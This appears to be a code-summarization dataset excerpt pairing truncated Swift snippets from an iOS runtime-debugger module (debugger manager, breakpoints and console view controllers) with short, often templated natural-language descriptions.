    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "struct"
  },
  {
    "id": "1056",
    "code": "public struct CommandResult {\nlet success: Bool\nlet output: String\n}\n\n/// Expression evaluation result\npublic struct ExpressionResult {",
    "nl": "/ Command result",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "struct"
  },
  {
    "id": "1057",
    "code": "public struct ExpressionResult {\nlet success: Bool\nlet value: String\nlet type: String\nlet hasChildren: Bool\n}\n\n/// Step type\npublic enum StepType {",
    "nl": "/ Expression evaluation result",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "struct"
  },
  {
    "id": "1058",
    "code": "public enum StepType {\ncase over\ncase into\ncase out\n}\n\n// MARK: - Notification Names\n\nextension Notification.Name {",
    "nl": "/ Step type",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "enum"
  },
  {
    "id": "1059",
    "code": "extension Notification.Name {\nstatic let debuggerBreakpointHit = Notification.Name(\"debuggerBreakpointHit\")\nstatic let debuggerBreakpointAdded = Notification.Name(\"debuggerBreakpointAdded\")\nstatic let debuggerBreakpointRemoved = Notification.Name(\"debuggerBreakpointRemoved\")\nstatic let debuggerWatchpointTriggered = Notification.Name(\"debuggerWatchpointTriggered\")\nstatic let debuggerWatchpointAdded = Notification.Name(\"debuggerWatchpointAdded\")\nstatic let debuggerWatchpointRemoved = Notification.Name(\"debuggerWatchpointRemoved\")\nstatic let debuggerExceptionCaught = Notification.Name(\"debuggerExceptionCaught\")\nstatic let debuggerExecutionPaused = Notification.Name(\"debuggerExecutionPaused\")\nstatic let debuggerExecutionResumed = Notification.Name(\"debuggerExecutionResumed\")",
    "nl": "MARK: - Notification Names",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerEngine.swift",
    "code_type": "extension"
  },
  {
    "id": "1060",
    "code": "public final class DebuggerManager {\n// MARK: - Singleton\n\n/// Shared instance of the debugger manager\npublic static let shared = DebuggerManager()\n\n// MARK: - Properties\n\n/// Logger for debugger operations\nprivate let logger = Debug.shared",
    "nl": "/ Manager class for the runtime debugger / Handles the floating button and debugger UI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "class"
  },
  {
    "id": "1061",
    "code": "public func initialize() {\nlogger.log(message: \"Initializing debugger\", type: .info)\n\n// Show the floating button\nDispatchQueue.main.async { [weak self] in",
    "nl": "MARK: - Public Methods / Initialize the debugger / This should be called from the AppDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1062",
    "code": "public func showDebugger() {\nguard !isDebuggerVisible else { return }",
    "nl": "/ Show the debugger UI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1063",
    "code": "public func hideDebugger() {\nguard isDebuggerVisible, let debuggerVC = debuggerViewController else { return }",
    "nl": "/ Hide the debugger UI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1064",
    "code": "public func showFloatingButton() {\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Show the floating button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1065",
    "code": "public func hideFloatingButton() {\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Hide the floating button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1066",
    "code": "private func setupObservers() {\n// Listen for button taps\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleShowDebugger),\nname: .showDebugger,\nobject: nil\n)\n\n// Listen for show/hide button notifications",
    "nl": "MARK: - Private Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1067",
    "code": "@objc private func handleShowDebugger() {\nshowDebugger()\n}\n\n@objc private func handleShowFloatingButton() {",
    "nl": "Function handleShowDebugger - implements handleshowdebugger functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1068",
    "code": "@objc private func handleShowFloatingButton() {\nshowFloatingButton()\n}\n\n@objc private func handleHideFloatingButton() {",
    "nl": "Function handleShowFloatingButton - implements handleshowfloatingbutton functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1069",
    "code": "@objc private func handleHideFloatingButton() {\nhideFloatingButton()\n}\n\n@objc private func handleOrientationChange() {",
    "nl": "Function handleHideFloatingButton - implements handlehidefloatingbutton functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1070",
    "code": "@objc private func handleOrientationChange() {\n// Ensure the floating button is still visible after orientation change\nif floatingButton.superview != nil {",
    "nl": "Function handleOrientationChange - implements handleorientationchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1071",
    "code": "@objc private func handleAppDidBecomeActive() {\n// Show the floating button when app becomes active\nif !isDebuggerVisible {",
    "nl": "Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1072",
    "code": "@objc private func handleAppWillResignActive() {\n// No need to do anything when app resigns active\n}\n}\n\n// MARK: - DebuggerViewControllerDelegate\n\nextension DebuggerManager: DebuggerViewControllerDelegate {",
    "nl": "Function handleAppWillResignActive - implements handleappwillresignactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1073",
    "code": "extension DebuggerManager: DebuggerViewControllerDelegate {\nfunc debuggerViewControllerDidRequestDismissal(_: DebuggerViewController) {",
    "nl": "MARK: - DebuggerViewControllerDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1074",
    "code": "func debuggerViewControllerDidRequestDismissal(_: DebuggerViewController) {\nhideDebugger()\n}\n}\n\n// MARK: - UIApplication Extension\n\nextension UIApplication {",
    "nl": "Function debuggerViewControllerDidRequestDismissal - implements debuggerviewcontrollerdidrequestdismissal functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1075",
    "code": "extension UIApplication {\nprivate func findTopViewController(_ controller: UIViewController) -> UIViewController {",
    "nl": "MARK: - UIApplication Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "extension"
  },
  {
    "id": "1076",
    "code": "private func findTopViewController(_ controller: UIViewController) -> UIViewController {\nif let presentedController = controller.presentedViewController {",
    "nl": "Function findTopViewController - implements findtopviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/Core/DebuggerManager.swift",
    "code_type": "function"
  },
  {
    "id": "1077",
    "code": "class BreakpointsViewController: UIViewController {\n// MARK: - Properties\n\n/// The debugger engine\nprivate let debuggerEngine = DebuggerEngine.shared\n\n/// Logger instance\nprivate let logger = Debug.shared\n\n/// Table view for displaying breakpoints",
    "nl": "/ View controller for the breakpoints tab in the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1078",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupUI()\nsetupActions()\nsetupNotifications()\n\n// Set title\ntitle = \"Breakpoints\"\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1079",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Reload breakpoints when view appears\nreloadBreakpoints()\n}\n\n// MARK: - Setup\n\nprivate func setupUI() {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1080",
    "code": "private func setupUI() {\n// Set background color\nview.backgroundColor = UIColor.systemBackground\n\n// Add table view\nview.addSubview(tableView)\n\n// Add add button\nview.addSubview(addButton)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1081",
    "code": "private func setupActions() {\n// Add target for add button\naddButton.addTarget(self, action: #selector(addBreakpointTapped), for: .touchUpInside)\n}\n\nprivate func setupNotifications() {",
    "nl": "Function setupActions - sets upactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1082",
    "code": "private func setupNotifications() {\n// Listen for breakpoint added notifications\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleBreakpointAdded),\nname: .debuggerBreakpointAdded,\nobject: nil\n)\n\n// Listen for breakpoint removed notifications",
    "nl": "Function setupNotifications - sets upnotifications",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1083",
    "code": "@objc private func addBreakpointTapped() {\n// Show add breakpoint alert\nlet alertController = UIAlertController(\ntitle: \"Add Breakpoint\",\nmessage: \"Enter file path and line number\",\npreferredStyle: .alert\n)\n\n// Add file text field\nalertController.addTextField { textField in",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1084",
    "code": "@objc private func handleBreakpointAdded(_: Notification) {\n// Reload breakpoints\nreloadBreakpoints()\n}\n\n@objc private func handleBreakpointRemoved(_: Notification) {",
    "nl": "Function handleBreakpointAdded - implements handlebreakpointadded functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1085",
    "code": "@objc private func handleBreakpointRemoved(_: Notification) {\n// Reload breakpoints\nreloadBreakpoints()\n}\n\n@objc private func handleBreakpointHit(_: Notification) {",
    "nl": "Function handleBreakpointRemoved - implements handlebreakpointremoved functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1086",
    "code": "@objc private func handleBreakpointHit(_: Notification) {\n// Reload breakpoints to update hit counts\nreloadBreakpoints()\n}\n\n// MARK: - Helper Methods\n\nprivate func reloadBreakpoints() {",
    "nl": "Function handleBreakpointHit - implements handlebreakpointhit functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1087",
    "code": "private func reloadBreakpoints() {\n// Get breakpoints from debugger engine\nbreakpoints = debuggerEngine.getBreakpoints()\n\n// Reload table view\ntableView.reloadData()\n}\n}\n\n// MARK: - UITableViewDelegate",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1088",
    "code": "extension BreakpointsViewController: UITableViewDelegate {\nfunc tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1089",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\n// Get breakpoint\nlet breakpoint = breakpoints[indexPath.row]\n\n// Show breakpoint details alert\nlet alertController = UIAlertController(\ntitle: \"Breakpoint Details\",\nmessage: \"File: \\(breakpoint.file)\\nLine: \\(breakpoint.line)\\nCondition: \\(breakpoint.condition ?? \"None\")\\nHit Count: \\(breakpoint.hitCount)\",",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1090",
    "code": "func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat {\nreturn 60\n}\n}\n\n// MARK: - UITableViewDataSource\n\nextension BreakpointsViewController: UITableViewDataSource {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1091",
    "code": "extension BreakpointsViewController: UITableViewDataSource {\nfunc tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1092",
    "code": "func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn breakpoints.count\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1093",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nguard let cell = tableView.dequeueReusableCell(\nwithIdentifier: BreakpointTableViewCell.reuseIdentifier,\nfor: indexPath\n) as? BreakpointTableViewCell else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1094",
    "code": "func tableView(\n_: UITableView,\ncommit editingStyle: UITableViewCell.EditingStyle,\nforRowAt indexPath: IndexPath\n) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1095",
    "code": "class BreakpointTableViewCell: UITableViewCell {\n// MARK: - Properties\n\nstatic let reuseIdentifier = \"BreakpointTableViewCell\"\n\n/// File label\nprivate let fileLabel: UILabel = {",
    "nl": "MARK: - BreakpointTableViewCell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1096",
    "code": "private func setupUI() {\n// Add file label\ncontentView.addSubview(fileLabel)\n\n// Add line label\ncontentView.addSubview(lineLabel)\n\n// Add condition label\ncontentView.addSubview(conditionLabel)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1097",
    "code": "func configure(with breakpoint: Breakpoint) {\n// Set file label\nlet fileName = (breakpoint.file as NSString).lastPathComponent\nfileLabel.text = fileName\n\n// Set line label\nlineLabel.text = \"Line: \\(breakpoint.line)\"\n\n// Set condition label\nif let condition = breakpoint.condition {",
    "nl": "MARK: - Configuration",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/BreakpointsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1098",
    "code": "class ConsoleViewController: UIViewController {\n// MARK: - Properties\n\n/// The debugger engine\nprivate let debuggerEngine = DebuggerEngine.shared\n\n/// Logger instance\nprivate let logger = Debug.shared\n\n/// Text view for displaying console output",
    "nl": "/ View controller for the console tab in the debugger",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1099",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupUI()\nsetupActions()\nsetupNotifications()\n\n// Set title\ntitle = \"Console\"\n",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1100",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Register for keyboard notifications\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(keyboardWillShow),\nname: UIResponder.keyboardWillShowNotification,\nobject: nil\n)",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1101",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\n\n// Unregister for keyboard notifications\nNotificationCenter.default.removeObserver(\nself,\nname: UIResponder.keyboardWillShowNotification,\nobject: nil\n)\n",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1102",
    "code": "private func setupUI() {\n// Set background color\nview.backgroundColor = UIColor.systemBackground\n\n// Add console text view\nview.addSubview(consoleTextView)\n\n// Add command input field\nview.addSubview(commandTextField)\n",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1103",
    "code": "private func setupActions() {\n// Add target for execute button\nexecuteButton.addTarget(self, action: #selector(executeCommand), for: .touchUpInside)\n\n// Add target for clear button\nclearButton.addTarget(self, action: #selector(clearConsole), for: .touchUpInside)\n\n// Set text field delegate\ncommandTextField.delegate = self\n}",
    "nl": "Function setupActions - sets upactions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1104",
    "code": "private func setupNotifications() {\n// Listen for exception notifications\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleExceptionCaught),\nname: .debuggerExceptionCaught,\nobject: nil\n)\n\n// Listen for breakpoint hit notifications",
    "nl": "Function setupNotifications - sets upnotifications",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1105",
    "code": "@objc private func executeCommand() {\nguard let command = commandTextField.text?.trimmingCharacters(in: .whitespacesAndNewlines),\n!command.isEmpty\nelse {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1106",
    "code": "@objc private func clearConsole() {\nconsoleTextView.text = \"\"\n\n// Add welcome message\nappendToConsole(\"iOS Runtime Debugger Console\\n\")\nappendToConsole(\"Type 'help' for available commands\\n\")\n}\n\n@objc private func handleExceptionCaught(_ notification: Notification) {",
    "nl": "Function clearConsole - implements clearconsole functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1107",
    "code": "@objc private func handleExceptionCaught(_ notification: Notification) {\nguard let exceptionInfo = notification.object as? ExceptionInfo else { return }",
    "nl": "Function handleExceptionCaught - implements handleexceptioncaught functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1108",
    "code": "@objc private func handleBreakpointHit(_ notification: Notification) {\nguard let breakpoint = notification.object as? Breakpoint else { return }",
    "nl": "Function handleBreakpointHit - implements handlebreakpointhit functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1109",
    "code": "@objc private func keyboardWillShow(_ notification: Notification) {\nguard let keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect else {",
    "nl": "Function keyboardWillShow - implements keyboardwillshow functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1110",
    "code": "@objc private func keyboardWillHide(_: Notification) {\n// Reset console text view bottom constraint\nlet contentInsets = UIEdgeInsets.zero\nconsoleTextView.contentInset = contentInsets\nconsoleTextView.scrollIndicatorInsets = contentInsets\n}\n\n// MARK: - Helper Methods\n\nprivate func appendToConsole(_ text: String) {",
    "nl": "Function keyboardWillHide - implements keyboardwillhide functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1111",
    "code": "private func appendToConsole(_ text: String) {\n// Add text to console\nconsoleTextView.text.append(text)\n\n// Scroll to bottom\nlet range = NSRange(location: consoleTextView.text.count, length: 0)\nconsoleTextView.scrollRangeToVisible(range)\n}\n\nprivate func showPreviousCommand() {",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1112",
    "code": "private func showPreviousCommand() {\n// Update history position\nif historyPosition < commandHistory.count - 1 {",
    "nl": "Function showPreviousCommand - implements showpreviouscommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1113",
    "code": "private func showNextCommand() {\n// Update history position\nif historyPosition > 0 {",
    "nl": "Function showNextCommand - implements shownextcommand functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1114",
    "code": "extension ConsoleViewController: UITextFieldDelegate {\nfunc textFieldShouldReturn(_: UITextField) -> Bool {",
    "nl": "MARK: - UITextFieldDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "1115",
    "code": "func textFieldShouldReturn(_: UITextField) -> Bool {\nexecuteCommand()\nreturn true\n}\n\nfunc textField(_: UITextField, shouldChangeCharactersIn _: NSRange, replacementString _: String) -> Bool {",
    "nl": "Function textFieldShouldReturn - implements textfieldshouldreturn functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1116",
    "code": "func textField(_: UITextField, shouldChangeCharactersIn _: NSRange, replacementString _: String) -> Bool {\n// Reset history position when user types\nhistoryPosition = -1\nreturn true\n}\n}\n",
    "nl": "Function textField - implements textfield functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/ConsoleViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1117",
    "code": "protocol DebuggerViewControllerDelegate: AnyObject {\n/// Called when the debugger view controller requests dismissal\nfunc debuggerViewControllerDidRequestDismissal(_ viewController: DebuggerViewController)\n}\n\n/// Main view controller for the debugger UI\nclass DebuggerViewController: UIViewController {",
    "nl": "/ Protocol for debugger view controller delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "protocol"
  },
  {
    "id": "1118",
    "code": "func debuggerViewControllerDidRequestDismissal(_ viewController: DebuggerViewController)\n}\n\n/// Main view controller for the debugger UI\nclass DebuggerViewController: UIViewController {",
    "nl": "/ Called when the debugger view controller requests dismissal",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1119",
    "code": "class DebuggerViewController: UIViewController {\n// MARK: - Properties\n\n/// Delegate for handling view controller events\nweak var delegate: DebuggerViewControllerDelegate?\n\n/// The debugger engine\nprivate let debuggerEngine = DebuggerEngine.shared\n\n/// Logger instance",
    "nl": "/ Main view controller for the debugger UI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "class"
  },
  {
    "id": "1120",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\nsetupNavigationBar()\nsetupTabBarController()\n\nlogger.log(message: \"DebuggerViewController loaded\", type: .info)\n}\n\noverride func viewWillAppear(_ animated: Bool) {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1121",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Register as delegate for debugger engine\ndebuggerEngine.delegate = self\n}\n\noverride func viewWillDisappear(_ animated: Bool) {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1122",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\n\n// Unregister as delegate\nif debuggerEngine.delegate === self {",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Debugger/UI/DebuggerViewController.swift",
    "code_type": "function"
  },
  {
    "id": "1123",
    "code": "private func setupNavigationBar() {\n// Set title\ntitle = \"Runtime Debugger\"\n\n// Add close button\nlet closeButton = UIBarButtonItem(\nbarButtonSystemItem: .close,\ntarget: self,\naction: #selector(closeButtonTapped)\n)",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
